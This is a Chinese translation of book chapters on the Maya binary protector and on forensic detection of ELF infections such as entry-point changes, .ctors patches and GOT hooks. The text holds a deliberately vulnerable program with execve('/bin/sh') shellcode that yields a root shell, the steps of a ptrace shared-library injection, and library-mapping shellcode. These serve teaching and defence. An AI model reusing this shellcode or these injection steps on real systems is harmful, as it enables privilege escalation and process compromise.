以下是一个特制的易受攻击的软件代码示例，用于测试和展示 Maya 的反 ROP 功能：

#### vuln.c 的源代码

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

/*
 * This shellcode does execve("/bin/sh", …)
 /
char shellcode[] = "\xeb\x1d\x5b\x31\xc0\x67\x89\x43\x07\x67\x89\x5b\x08\x67\x89\x43\"
"x0c\x31\xc0\xb0\x0b\x67\x8d\x4b\x08\x67\x8d\x53\x0c\xcd\x80\xe8"
"\xde\xff"\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41"
"\x42\x42";

/*
 * This function is vulnerable to a buffer overflow. Our goal is to
 * overwrite the return address with 0x41414141 which is the addresses
 * that we mmap() and store our shellcode in.
 */
int vuln(char *s)
{
        char buf[32];
        int i;

        for (i = 0; i < strlen(s); i++) {
                buf[i] = *s;
                s++;
        }
}

int main(int argc, char **argv)
{
        if (argc < 2)
        {
                printf("Please supply a string\n");
                exit(0);
        }
        int i;
        char *mem = mmap((void *)(0x41414141 & ~4095),
                                 4096,
                                 PROT_READ|PROT_WRITE|PROT_EXEC,
                                 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,
                                -1,
                                 0);

        memcpy((char *)(mem + 0x141), (void *)&shellcode, 46);
        vuln(argv[1]);
        exit(0);

}
```

#### 利用 vuln.c 的示例

让我们看看如何利用`vuln.c`：

```
$ gcc -fno-stack-protector vuln.c -o vuln
$ sudo chmod u+s vuln
$ ./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# whoami
root
#
```

现在让我们使用 Maya 的`-c`选项来保护 vuln，这意味着控制流完整性。然后我们将尝试利用受保护的二进制文件：

```
 $ ./maya -l2 -cse vuln

[MODE] Layer 2: Anti-debugging/anti-code-injection, runtime function level protection, and outter layer of encryption on code/data
[MODE] CFLOW ROP protection, and anti-exploitation
[+] Extracting information for RO Relocations
[+] Generating control flow data
[+] Function level decryption layer knowledge information:
[+] Applying function level code encryption:simple stream cipher S
[+] Applying host executable/data sections: SALSA20 streamcipher (2nd layer protection)
[+] Maya's Mind-- injection address: 0x3c9000
[+] Encrypting knowledge: 111892 bytes
[+] Extracting information for RO Relocations
[+] Successfully protected binary, output file is named vuln.maya

$ ./vuln.maya AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[MAYA CONTROL FLOW] Detected an illegal return to 0x41414141, possible exploitation attempt!
Segmentation fault
$
```

这表明 Maya 已经检测到一个无效的返回地址`0x41414141`，在返回指令实际成功之前。Maya 的运行时引擎通过安全地崩溃程序来干扰（而不是利用）。

Maya 强制执行的另一个反利用功能是**relro**（**只读重定位**）。大多数现代 Linux 系统都启用了此功能，但如果未启用，Maya 将通过使用`mprotect()`创建一个包含`the.jcr`、`.dynamic`、`.got`、`.ctors`（`.init_array`）和`.dtors`（`.fini_array`）部分的只读页面来强制执行。其他反利用功能（如函数指针完整性）正在计划中，尚未纳入代码库。

# 下载 Maya 保护的二进制文件

对于那些有兴趣逆向工程一些使用 Maya 的 Veil 保护的简单程序的人，可以随意下载一些样本，这些样本可以在[`www.bitlackeys.org/maya_crackmes.tgz`](http://www.bitlackeys.org/maya_crackmes.tgz)上找到。此链接包含三个文件：`crackme.elf_hardest`、`crackme.elf_medium`和`test.maya`。

# 二进制保护的反调试

由于二进制保护程序通常加密或混淆程序的物理主体，静态分析可能非常困难，并且在许多情况下将被证明是徒劳的。大多数试图解包或破解受保护二进制文件的逆向工程师都会同意，必须使用动态分析和静态分析的组合来访问二进制文件的解密主体。

受保护的二进制文件必须解密自身，或者至少解密在运行时执行的部分。没有任何反调试技术，逆向工程师可以简单地附加到受保护程序的进程，并在存根的最后一条指令上设置断点（假设存根解密整个可执行文件）。

一旦触发断点，攻击者可以查看受保护二进制文件所在的代码段，并找到其解密后的主体。这将非常简单，因此对于良好的二进制保护来说，使用尽可能多的技术使逆向工程师难以进行调试和动态分析非常重要。像 Maya 这样的保护程序会竭尽全力保护二进制免受静态和动态分析的影响。

动态分析并不局限于`ptrace`系统调用，尽管大多数调试器仅限于此目的来访问和操作进程。因此，二进制保护程序不应仅限于保护`ptrace`；理想情况下，它还应该对其他形式的动态分析具有抵抗力，比如模拟和动态插装（例如**Pin**和**DynamoRIO**）。我们在前几章中介绍了许多针对`ptrace`分析的反调试技术，但对于模拟的抵抗力呢？

# 对模拟的抵抗力

通常，仿真器用于对可执行文件执行动态分析和逆向工程任务。这样做的一个非常好的原因是它们允许逆向工程师轻松地操纵执行的控制，并且它们也绕过了许多典型的反调试技术。有许多仿真器被广泛使用——QEMU、BOCHS 和 Chris Eagles 的 IDA X86 仿真器插件，只是其中一些。因此，存在无数的反仿真技术，但其中一些是特定于每个仿真器的特定实现。

这个话题可以扩展到一些非常深入的讨论，并且可以朝多个方向发展，但我将把它限制在我自己的经验范围内。在我自己对 Maya 保护程序中的仿真和反仿真的实验中，我学到了一些通用的技术，应该对至少一些仿真器有效。我们的二进制保护程序的反仿真目标是能够检测是否在仿真器中运行，并且如果是真的，它应该停止执行并退出。

## 通过系统调用测试检测仿真

这种技术在应用级仿真器中特别有用，这些仿真器在某种程度上与操作系统无关，并且不太可能实现超出基本系统调用（`read`、`write`、`open`、`mmap`等）的功能。如果仿真器不支持系统调用，并且也不将不支持的系统调用委托给内核，那么很可能会得到错误的返回值。

因此，二进制保护程序可以调用少量不太常见的系统调用，并检查返回值是否与预期值匹配。非常类似的技术是调用某些中断处理程序，看它们是否表现正常。无论哪种情况，我们都在寻找仿真器没有正确实现的操作系统特性。

## 检测仿真 CPU 的不一致性

仿真器完美仿真 CPU 架构的可能性几乎为零。因此，通常会寻找仿真器行为与 CPU 应该行为之间的某些不一致之处。其中一种技术是尝试写入特权指令，例如调试寄存器（例如`db0`到`db7`）或控制寄存器（例如`cr0`到`cr4`）。仿真检测代码可能有一个尝试写入`cr0`并查看是否成功的 ASM 代码存根。

## 检查某些指令之间的时间延迟

另一种有时可能会导致仿真器本身不稳定的技术是检查某些指令之间的时间戳，并查看执行所需的时间。真实的 CPU 应该比仿真器快几个数量级地执行一系列指令。

# 混淆方法

二进制可以以许多创造性的方式进行混淆或加密。大多数二进制保护程序只是用一层或多层保护来保护整个二进制文件。在运行时，二进制文件被解密，并且可以从内存中转储以获取解压后的二进制文件的副本。在更高级的保护程序中，例如 Maya，每个函数都是单独加密的，并且一次只允许解密一个函数。

一旦二进制文件被加密，它当然必须将加密密钥存储在某个地方。在 Maya（前面讨论过）的情况下，设计了一个自定义堆实现，它本身使用加密来存储加密密钥。在某个时候，似乎必须暴露一个密钥（例如用于解密另一个密钥的密钥），但可以使用特殊技术，如白盒密码术，使这些最终密钥极其模糊。如果在保护程序中使用内核的帮助，那么可以将密钥存储在二进制和处理内存之外。

代码混淆技术（例如虚假反汇编，在第四章中描述，*ELF 病毒技术- Linux/Unix 病毒*）也常用于二进制保护，以使对已解密或从未加密的代码进行静态分析更加困难。二进制保护程序通常还会从二进制文件中剥离段头表，并删除其中的任何不需要的字符串和字符串表，比如那些提供符号名称的字符串。

# 保护控制流完整性

受保护的二进制文件应该在运行时（进程本身）保护程序，就像在磁盘上静止的二进制文件一样多，甚至更多。运行时攻击通常可以分为两种类型：

+   基于`ptrace`的攻击

+   基于漏洞的攻击

## 基于 ptrace 的攻击

第一种类型，基于`ptrace`的攻击，也属于调试进程的范畴。正如前面讨论的，二进制保护程序希望使基于`ptrace`的调试对逆向工程师非常困难。然而，除了调试之外，还有许多其他攻击可能有助于破坏受保护的二进制文件，了解并理解其中一些是很重要的，以便进一步阐明为什么二进制保护程序希望保护运行中的进程免受`ptrace`的攻击。

如果一个保护程序已经走得很远，能够检测断点指令（因此使调试更加困难），但无法保护自己免受`ptrace`跟踪，那么它可能仍然非常容易受到基于`ptrace`的攻击，比如函数劫持和共享库注入。攻击者可能不只是想解包一个受保护的二进制文件，而是可能只想改变二进制文件的行为。一个良好的二进制保护程序应该努力保护其控制流的完整性。

想象一下，一个攻击者知道一个受保护的二进制文件正在调用`dlopen()`函数来加载一个特定的共享库，而攻击者希望该进程加载一个木马共享库。以下步骤可能导致攻击者通过改变其控制流来破坏受保护的二进制文件：

1.  使用`ptrace`附加到进程。

1.  修改全局偏移表条目以使`dlopen()`指向`libc.so`中的`__libc_dlopen_mode`。

1.  调整`%rdi`寄存器，使其指向这个路径：`/tmp/evil_lib.so`。

1.  继续执行。

此时，攻击者刚刚强制一个受保护的二进制文件加载了一个恶意的共享库，因此完全破坏了受保护二进制文件的安全性。

正如前面讨论的，Maya 保护程序通过运行时引擎作为主动调试器来防范此类漏洞，防止其他进程附加。如果保护程序能够禁用`ptrace`附加到受保护进程，那么该进程在很大程度上就不太容易受到这种类型的运行时攻击。

## 基于安全漏洞的攻击

基于漏洞的攻击是一种攻击类型，攻击者可能能够利用受保护程序中固有的弱点，比如基于堆栈的缓冲区溢出，并随后改变执行流程为他们选择的内容。

这种类型的攻击通常更难对受保护的程序进行，因为它提供的关于自身的信息要少得多，并且使用调试器来缩小利用中内存中使用的位置的范围可能更难获得洞察。尽管如此，这种类型的攻击是非常可能的，这就是为什么 Maya 保护程序强制执行控制流完整性和只读重定位，以特别防范漏洞利用攻击。

我不知道现在是否有其他保护程序正在使用类似的反利用技术，但我只能推测它们存在。

# 其他资源

在二进制保护上只写一章是远远不够全面的，无法教会你关于这个主题的所有知识。本书的其他章节相互补充，当结合在一起时，它们将帮助你深入理解。关于这个主题有许多好资源，其中一些已经提到过。

特别推荐一份由 Andrew Griffith 撰写的资源供阅读。这篇论文是十多年前写的，但描述了许多今天仍然与二进制保护相关的技术和实践：

[`www.bitlackeys.org/resources/binary_protection_schemes.pdf`](http://www.bitlackeys.org/resources/binary_protection_schemes.pdf)

这篇论文后来还有一个演讲，幻灯片可以在这里找到：

[`2005.recon.cx/recon2005/papers/Andrew_Griffiths/protecting_binaries.pdf`](http://2005.recon.cx/recon2005/papers/Andrew_Griffiths/protecting_binaries.pdf)

# 摘要

在本章中，我们揭示了 Linux 二进制保护方案的内部工作原理，并讨论了过去十年中为 Linux 发布的各种二进制保护程序的各种特性。

在下一章中，我们将从相反的角度探讨问题，并开始研究 Linux 中的 ELF 二进制取证。


# 第六章：Linux 中的 ELF 二进制取证

计算机取证领域广泛，包括许多调查方面。其中一个方面是对可执行代码的分析。对于黑客来说，安装某种恶意功能的最阴险的地方之一就是在某种可执行文件中。在 Linux 中，当然是 ELF 文件类型。我们已经探讨了一些感染技术，这些技术正在使用第四章，*ELF 病毒技术- Linux/Unix 病毒*，但几乎没有讨论分析阶段。调查人员应该如何探索二进制文件中的异常或代码感染？这正是本章的主题。

攻击者感染可执行文件的动机各不相同，可能是病毒、僵尸网络或后门。当然，还有许多情况下，个人想要修补或修改二进制文件以达到完全不同的目的，比如二进制保护、代码修补或其他实验。无论是恶意还是不恶意，二进制修改方法都是一样的。插入的代码决定了二进制文件是否具有恶意意图。

无论哪种情况，本章都将为读者提供必要的洞察力，以确定二进制文件是否已被修改，以及它究竟是如何被修改的。在接下来的页面中，我们将研究几种不同类型的感染，甚至讨论在对由世界上最有技术的病毒作者之一 JPanic 设计的 Linux 报复病毒进行实际分析时的一些发现。本章的目的是训练您的眼睛能够在 ELF 二进制文件中发现异常，通过一些实践，这是完全可能的。

# 检测入口点修改的科学

当二进制文件以某种方式被修改时，通常是为了向二进制文件添加代码，然后将执行流重定向到该代码。执行流的重定向可以发生在二进制文件的许多位置。在这种特殊情况下，我们将研究一种在修补二进制文件时经常使用的非常常见的技术，特别是对于病毒。这种技术就是简单地修改入口点，即 ELF 文件头的`e_entry`成员。

目标是确定`e_entry`是否保存了指向表示二进制文件异常修改的位置的地址。

### 注意

异常意味着任何不是由链接器本身`/usr/bin/ld`创建的修改，链接器的工作是将 ELF 对象链接在一起。链接器将创建一个代表正常状态的二进制文件，而不自然的修改通常会引起受过训练的眼睛的怀疑。

能够快速检测异常的最快途径是首先了解什么是正常的。让我们来看看两个正常的二进制文件：一个是动态链接的，另一个是静态链接的。两者都是使用`gcc`编译的，没有经过任何修改：

```
$ readelf -h bin1 | grep Entry
  Entry point address:               0x400520
$
```

因此，我们可以看到入口点是`0x400520`。如果我们查看部分头，我们可以看到这个地址属于哪个部分：

```
readelf -S bin1 | grep 4005
  [13] .text             PROGBITS         0000000000400520  00000520
```

### 注意

在我们的例子中，入口点从`.text`部分的开头开始。这并不总是这样，因此像之前那样搜索第一个重要的十六进制数字并不是一种一致的方法。建议您检查每个部分头的地址和大小，直到找到包含入口点的地址范围的部分。

正如我们所看到的，它指向了`.text`段的开头，这是常见的，但根据二进制文件的编译和链接方式，每个二进制文件可能会有所不同。这个二进制文件是被编译成与 libc 链接的，就像你遇到的 99%的二进制文件一样。这意味着入口点包含一些特殊的初始化代码，在每个 libc 链接的二进制文件中几乎是相同的，所以让我们来看看它，这样我们就知道在分析二进制文件的入口点代码时可以期待什么：

```
$ objdump -d --section=.text bin1

 0000000000400520 <_start>:
  400520:       31 ed                 xor    %ebp,%ebp
  400522:       49 89 d1              mov    %rdx,%r9
  400525:       5e                    pop    %rsi
  400526:       48 89 e2              mov    %rsp,%rdx
  400529:       48 83 e4 f0           and    $0xfffffffffffffff0,%rsp
  40052d:       50                    push   %rax
  40052e:       54                    push   %rsp
  40052f:       49 c7 c0 20 07 40 00   mov    $0x400720,%r8 // __libc_csu_fini
  400536:       48 c7 c1 b0 06 40 00  mov    $0x4006b0,%rcx // __libc_csu_init
  40053d:       48 c7 c7 0d 06 40 00  mov    $0x40060d,%rdi // main()
  400544:       e8 87 ff ff ff         callq  4004d0  // call libc_start_main()
...
```

前面的汇编代码是由 ELF 头部的`e_entry`指向的标准 glibc 初始化代码。这段代码总是在`main()`之前执行，其目的是调用初始化例程`libc_start_main()`：

```
libc_start_main((void *)&main, &__libc_csu_init, &libc_csu_fini);
```

此函数设置进程堆段，注册构造函数和析构函数，并初始化与线程相关的数据。然后调用`main()`。

现在你知道了 libc 链接二进制文件的入口点代码是什么样子，你应该能够轻松地确定入口点地址是否可疑，当它指向不像这样的代码，或者根本不在`.text`段中时！

### 注意

与 libc 静态链接的二进制文件将在 _start 中具有与前面代码几乎相同的初始化代码，因此对于静态链接的二进制文件也适用相同的规则。

现在让我们来看看另一个被 Retaliation 病毒感染的二进制文件，并看看入口点存在什么样的奇怪之处：

```
$ readelf -h retal_virus_sample | grep Entry
  Entry point address:        0x80f56f
```

通过`readelf -S`快速检查段头部，将证明这个地址没有被任何段头部记录，这是非常可疑的。如果一个可执行文件有段头部，并且有一个未被段记录的可执行区域，那几乎肯定是感染或二进制文件被篡改的迹象。要执行代码，段头部是不必要的，因为我们已经学过，但程序头部是必要的。

让我们来看看通过使用`readelf -l`查看程序头部，这个地址属于哪个段：

```
Elf file type is EXEC (Executable file)
Entry point 0x80f56f
There are 9 program headers, starting at offset 64

Program Headers:
  Type       Offset             VirtAddr           PhysAddr
             FileSiz            MemSiz              Flags  Align
  PHDR       0x0000000000000040 0x0000000000400040 0x0000000000400040
             0x00000000000001f8 0x00000000000001f8  R E    8
  INTERP     0x0000000000000238 0x0000000000400238 0x0000000000400238
             0x000000000000001c 0x000000000000001c  R      1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD       0x0000000000000000 0x0000000000400000 0x0000000000400000
             0x0000000000001244 0x0000000000001244  R E    200000
  LOAD       0x0000000000001e28 0x0000000000601e28 0x0000000000601e28
             0x0000000000000208 0x0000000000000218  RW     200000
  DYNAMIC    0x0000000000001e50 0x0000000000601e50 0x0000000000601e50
             0x0000000000000190 0x0000000000000190  RW     8
  LOAD       0x0000000000003129 0x0000000000803129 0x0000000000803129
 0x000000000000d9a3 0x000000000000f4b3  RWE    200000

```

这个输出有几个非常可疑的原因。通常，我们只会在一个 ELF 可执行文件中看到两个 LOAD 段——一个用于文本，一个用于数据——尽管这不是一个严格的规则。然而，这是正常情况，而这个二进制文件显示了三个段。

此外，这个段可疑地标记为 RWE（读+写+执行），这表明存在自修改代码，通常与具有多态引擎的病毒一起使用。入口点指向这第三个段内部，而它应该指向第一个段（文本段），我们可以看到，文本段的虚拟地址为`0x400000`，这是 Linux x86_64 可执行文件的典型文本段地址。我们甚至不需要查看代码就可以相当有信心地认为这个二进制文件已经被篡改。

但是为了验证，特别是如果你正在设计执行二进制文件自动分析的代码，你可以检查入口点的代码，看它是否与预期的样子相匹配，这就是我们之前看到的 libc 初始化代码。

以下`gdb`命令显示了在`retal_virus_sample`可执行文件的入口点处找到的反汇编指令：

```
(gdb) x/12i 0x80f56f
   0x80f56f:  push   %r11
   0x80f571:  movswl %r15w,%r11d
   0x80f575:  movzwq -0x20d547(%rip),%r11        # 0x602036
   0x80f57d:  bt     $0xd,%r11w
   0x80f583:  movabs $0x5ebe954fa,%r11
   0x80f58d:  sbb    %dx,-0x20d563(%rip)        # 0x602031
   0x80f594:  push   %rsi
   0x80f595:  sete   %sil
   0x80f599:  btr    %rbp,%r11
   0x80f59d:  imul   -0x20d582(%rip),%esi        # 0x602022
   0x80f5a4:  negw   -0x20d57b(%rip)        # 0x602030 <completed.6458>
   0x80f5ab:  bswap  %rsi
```

我认为我们可以很快地达成一致，前面的代码看起来不像我们期望在未篡改的可执行文件的入口点代码中看到的 libc 初始化代码。你可以简单地将它与我们从`bin1`中查看的预期 libc 初始化代码进行比较来找出这一点。

修改入口点的其他迹象是地址指向`.text`部分之外的任何部分，特别是如果它是文本段内最后一个部分（有时是`.eh_frame`部分）。另一个确定的迹象是，如果地址指向数据段内通常标记为可执行的位置（使用`readelf -l`可见），以便执行寄生代码。

### 注意

通常，数据段标记为 RW，因为不应该在该段中执行任何代码。如果您看到数据标记为 RWX，那么请将其视为一个警告信号，因为这是极其可疑的。

修改入口点并不是创建插入代码的唯一方法。这是一种常见的方法，能够检测到这一点是一种重要的启发式方法，特别是在恶意软件中，因为它可以揭示寄生代码的起始点。在下一节中，我们将讨论用于劫持控制流的其他方法，这并不总是在执行的开始，而是在中间甚至在结束时。

# 检测其他形式的控制流劫持

有许多原因可以修改二进制文件，根据所需的功能，二进制控制流将以不同的方式进行修补。在前面关于报复病毒的示例中，修改了 ELF 文件头中的入口点。还有许多其他方法可以将执行转移到插入的代码，我们将讨论一些更常见的方法。

## 修补.ctors/.init_array 部分

在 ELF 可执行文件和共享库中，您会注意到通常存在一个名为`.ctors`（通常也称为`.init_array`）的部分。该部分包含一个地址数组，这些地址是由`.init`部分的初始化代码调用的函数指针。函数指针指向使用构造函数属性创建的函数，在`main()`之前执行。这意味着`.ctors`函数指针表可以使用指向已注入到二进制文件中的代码的地址进行修补，我们称之为寄生代码。

检查`.ctors`部分中的地址是否有效相对容易。构造函数例程应始终存储在文本段的`.text`部分中。请记住来自第二章，《ELF 二进制格式》，`.text`部分不是文本段，而是驻留在文本段范围内的部分。如果`.ctors`部分包含任何指向`.text`部分之外位置的函数指针，那么可能是时候产生怀疑了。

### 注意

**关于.ctors 用于反反调试的一点说明**

一些包含反调试技术的二进制文件实际上会创建一个合法的构造函数，调用`ptrace(PTRACE_TRACEME, 0);`。

如第四章，《ELF 病毒技术- Linux/Unix 病毒》中所讨论的，这种技术可以防止调试器附加到进程，因为一次只能附加一个跟踪器。如果发现二进制文件具有执行此反调试技巧的函数，并且在`.ctors`中具有函数指针，则建议简单地使用`0x00000000`或`0xffffffff`对该函数指针进行修补，这将使`__libc_start_main()`函数忽略它，从而有效地禁用反调试技术。在 GDB 中可以轻松完成此任务，例如，`set {long}address = 0xffffffff`，假设 address 是要修改的.ctors 条目的位置。

## 检测 PLT/GOT 挂钩

这种技术早在 1998 年就已经被使用，当时由 Silvio Cesare 在[`phrack.org/issues/56/7.html`](http://phrack.org/issues/56/7.html)上发表，其中讨论了共享库重定向的技术。

在第二章中，*ELF 二进制格式*，我们仔细研究了动态链接，并解释了**PLT**（过程链接表）和**GOT**（全局偏移表）的内部工作原理。具体来说，我们研究了延迟链接以及 PLT 包含的代码存根，这些代码存根将控制转移到存储在 GOT 中的地址。如果共享库函数（如`printf`）以前从未被调用过，则存储在 GOT 中的地址将指向 PLT，然后调用动态链接器，随后填充 GOT，使其指向映射到进程地址空间中的 libc 共享库中的`printf`函数的地址。

静态（静止）和热修补（内存中）通常会修改一个或多个 GOT 条目，以便调用一个经过修补的函数而不是原始函数。我们将检查一个已注入包含一个简单将字符串写入`stdout`的函数的目标文件的二进制文件。`puts(char *);`的 GOT 条目已被修补，指向注入函数的地址。

前三个 GOT 条目是保留的，通常不会被修补，因为这可能会阻止可执行文件正确运行（请参阅第二章，*ELF 二进制格式*，动态链接部分）。因此，作为分析人员，我们对观察从 GOT[3]开始的条目感兴趣。每个 GOT 值应该是一个地址。该地址可以有两个被认为是有效的值：

+   指向 PLT 的地址指针

+   指向有效共享库函数的地址指针

当二进制文件在磁盘上被感染（而不是运行时感染）时，GOT 条目将被修补，指向二进制文件中已注入代码的某个地方。请回顾第四章中讨论的内容，*ELF 病毒技术- Linux/Unix 病毒*，其中介绍了将代码注入可执行文件的多种方法。在我们将在这里查看的二进制文件示例中，使用了可重定位目标文件（`ET_REL`），该文件被插入到文本段的末尾，使用了第四章中讨论的 Silvio 填充感染。

分析已感染的二进制文件的`.got.plt`部分时，我们必须仔细验证从 GOT[4]到 GOT[N]的每个地址。这仍然比查看内存中的二进制文件要容易，因为在执行二进制文件之前，GOT 条目应该始终只指向 PLT，因为尚未解析共享库函数。

使用`readelf -S`实用程序并查找`.plt`部分，我们可以推断出 PLT 地址范围。在我现在查看的 32 位二进制文件中，它是`0x8048300` - `0x8048350`。在查看以下`.got.plt`部分之前，请记住这个范围。

### 从 readelf -S 命令的截断输出

```
[12] .plt     PROGBITS        08048300 000300 000050 04  AX  0   0 16
```

现在让我们看看 32 位二进制文件的`.got.plt`部分，看看是否有任何相关地址指向`0x8048300`–`0x8048350`之外的地方：

```
Contents of section .got.plt:
…
0x804a00c: 28860408 26830408 36830408 …
```

所以让我们把这些地址从它们的小端字节顺序中取出，并验证每个地址是否按预期指向`.plt`部分内：

+   `08048628`：这不指向 PLT！

+   `08048326`：这是有效的

+   `08048336`：这是有效的

+   `08048346`：这是有效的

GOT 位置`0x804a00c`包含地址`0x8048628`，它并不指向有效的位置。我们可以通过使用`readelf -r`命令查看重定位条目来查看`0x804a00c`对应的共享库函数，这会显示感染的 GOT 条目对应于 libc 函数`puts()`：

```
Relocation section '.rel.plt' at offset 0x2b0 contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   puts
0804a010  00000207 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a014  00000307 R_386_JUMP_SLOT   00000000   exit
0804a018  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main
```

因此，GOT 位置`0x804a00c`是`puts()`函数的重定位单元。通常情况下，它应该包含一个指向 GOT 偏移的 PLT 存根的地址，以便动态链接器被调用并解析该符号的运行时值。在这种情况下，GOT 条目包含地址`0x8048628`，它指向文本段末尾的可疑代码：

```
 8048628:       55                      push   %ebp
 8048629:       89 e5                   mov    %esp,%ebp
 804862b:       83 ec 0c                sub    $0xc,%esp
 804862e:       c7 44 24 08 25 00 00    movl   $0x25,0x8(%esp)
 8048635:       00
 8048636:       c7 44 24 04 4c 86 04    movl   $0x804864c,0x4(%esp)
 804863d:       08
 804863e:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 8048645:       e8 a6 ff ff ff          call   80485f0 <_write>
 804864a:       c9                      leave  
 804864b:       c3                      ret  
```

从技术上讲，我们甚至不需要知道这段代码的功能，就可以知道 GOT 被劫持了，因为 GOT 应该只包含指向 PLT 的地址，而这显然不是 PLT 地址：

```
$ ./host
HAHA puts() has been hijacked!
$
```

进一步的练习将是手动清除这个二进制文件，这是我定期提供的 ELF 研讨会培训中的一部分。清除这个二进制文件主要涉及对包含指向寄生体的`.got.plt`条目进行修补，并用指向适当 PLT 存根的指针替换它。

## 检测函数跳板

术语跳板的使用比较宽泛，但最初是指内联代码修补，其中在函数的过程序言的前 5 到 7 个字节上放置了一个`jmp`等分支指令。通常情况下，如果需要以原始方式调用被修补的函数，那么这个跳板会被临时替换为原始代码字节，然后迅速放回跳板指令。检测这类内联代码钩子非常容易，甚至可以通过某种程度的程序或脚本来自动化。

以下是两个跳板代码的示例（32 位 x86 汇编语言）：

+   类型 1：

```
movl $target, %eax
jmp *%eax
```

+   类型 2：

```
push $target
ret
```

1999 年 Silvio 撰写了一篇关于在内核空间中使用函数跳板进行函数劫持的经典论文。相同的概念可以应用于用户空间和内核；对于内核，您需要禁用 cr0 寄存器中的写保护位，使文本段可写，或者直接修改 PTE 以将给定页面标记为可写。我个人更喜欢前一种方法。关于内核函数跳板的原始论文可以在[`vxheaven.org/lib/vsc08.html`](http://vxheaven.org/lib/vsc08.html)找到。

检测函数跳板的最快方法是找到每个函数的入口点，并验证代码的前 5 到 7 个字节是否不是某种分支指令。编写一个可以做到这一点的 GDB 的 Python 脚本将非常容易。我以前很容易就写了 C 代码来做到这一点。

# 识别寄生代码特征

我们刚刚回顾了一些劫持执行流的常见方法。如果您可以确定执行流指向的位置，通常可以识别一些或所有的寄生代码。在*检测 PLT/GOT 钩子*部分，我们通过简单地定位已修改的 PLT/GOT 条目并查看该地址指向的位置来确定劫持`puts()`函数的寄生代码的位置，而在这种情况下，它指向了一个包含寄生代码的附加页面。

寄生代码可以被定义为不自然地插入二进制文件的代码；换句话说，它不是由实际的 ELF 对象链接器链接进来的。话虽如此，根据使用的技术，有几个特征有时可以归因于注入的代码。

**位置无关代码**（**PIC**）经常用于寄生体，以便它可以被注入到二进制或内存的任何位置，并且无论其在内存中的位置如何，都可以正常执行。PIC 寄生体更容易注入到可执行文件中，因为代码可以插入到二进制文件中，而无需考虑处理重定位。在某些情况下，比如我的 Linux 填充病毒[`www.bitlackeys.org/projects/lpv.c`](http://www.bitlackeys.org/projects/lpv.c)，寄生体被编译为一个带有 gcc-nostdlib 标志的可执行文件。它没有被编译为位置无关，但它没有 libc 链接，并且在寄生体代码本身中特别注意动态解析内存地址与指令指针相关的计算。

在许多情况下，寄生代码纯粹是用汇编语言编写的，因此在某种意义上更容易识别为潜在的寄生体，因为它看起来与编译器生成的代码不同。用汇编语言编写的寄生代码的一个特征是系统调用的处理方式。在 C 代码中，通常通过 libc 函数调用系统调用，这些函数将调用实际的系统调用。因此，系统调用看起来就像常规的动态链接函数。在手写的汇编代码中，系统调用通常是直接使用 Intel sysenter 或 syscall 指令调用的，有时甚至使用`int 0x80`（现在被认为是遗留的）。如果存在系统调用指令，我们可能会认为这是一个警告信号。

另一个警告信号，特别是在分析可能被感染的远程进程时，是看到`int3`指令，它可以用于许多目的，比如将控制权传递回执行感染的跟踪进程，甚至更令人不安的是，触发恶意软件或二进制保护程序中的某种反调试机制的能力。

以下 32 位代码将一个共享库映射到进程中，然后使用`int3`将控制权传递回跟踪器。请注意，`int 0x80`被用于调用系统调用。这个 shellcode 实际上很老了；我是在 2008 年写的。通常，现在我们希望在 Linux 中使用 sysenter 或 syscall 指令来调用系统调用，但`int 0x80`仍然有效；只是速度较慢，因此被认为是过时的。

```
_start:
        jmp B
A:

        # fd = open("libtest.so.1.0", O_RDONLY);

        xorl %ecx, %ecx
        movb $5, %al
        popl %ebx
        xorl %ecx, %ecx
        int $0x80

        subl $24, %esp

        # mmap(0, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0);

        xorl %edx, %edx
        movl %edx, (%esp)
        movl $8192,4(%esp)
        movl $7, 8(%esp)
        movl $2, 12(%esp)
        movl %eax,16(%esp)
        movl %edx, 20(%esp)
        movl $90, %eax
        movl %esp, %ebx
        int $0x80

        int3
B:
        call A
        .string "/lib/libtest.so.1.0"
```

如果你在磁盘上或内存中看到这段代码，你应该很快就会得出结论，它看起来不像是编译后的代码。一个明显的特征是使用**call/pop 技术**来动态检索`/lib/libtest.so.1.0`的地址。该字符串存储在`call A`指令之后，因此它的地址被推送到堆栈上，然后你可以看到它被弹出到`ebx`中，这不是常规的编译器代码。

### 注意

```
For runtime analysis, the infection vectors are many, and we will cover more about parasite identification in memory when we get into Chapter 7, *Process Memory Forensics*.
```

# 检查动态段以查找 DLL 注入痕迹

回想一下第二章，*ELF 二进制格式*，动态段可以在程序头表中找到，类型为`PT_DYNAMIC`。还有一个`.dynamic`部分，也指向动态段。

动态段是一个包含`d_tag`和相应值的 ElfN_Dyn 结构数组，该值存在于一个联合体中：

```
     typedef struct {
               ElfN_Sxword    d_tag;
               union {
                   ElfN_Xword d_val;
                   ElfN_Addr  d_ptr;
               } d_un;
           } ElfN_Dyn;
```

使用`readelf`我们可以轻松查看文件的动态段。

以下是一个合法的动态段的示例：

```
$ readelf -d ./test

Dynamic section at offset 0xe28 contains 24 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x4004c8
 0x000000000000000d (FINI)               0x400754
 0x0000000000000019 (INIT_ARRAY)         0x600e10
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x600e18
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x400298
